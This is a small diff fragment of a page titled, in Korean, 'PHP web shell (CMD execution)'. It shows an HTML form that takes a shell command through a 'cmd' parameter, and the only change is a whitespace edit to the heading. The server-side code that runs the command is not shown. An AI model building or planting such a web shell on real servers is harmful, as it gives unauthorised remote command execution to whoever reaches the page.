@@ -5,7 +5,7 @@
     <title>PHP 웹쉘 (CMD 실행)</title>
 </head>
 <body>
-    <h2>🔧 명령어 실행기</h2>
+    <h2>🔧 명령어 실행기</h2> 
     <form method="GET">
         <input type="text" name="cmd" placeholder="명령어 입력 예: ls -la" size="50">
         <button type="submit">실행</button>
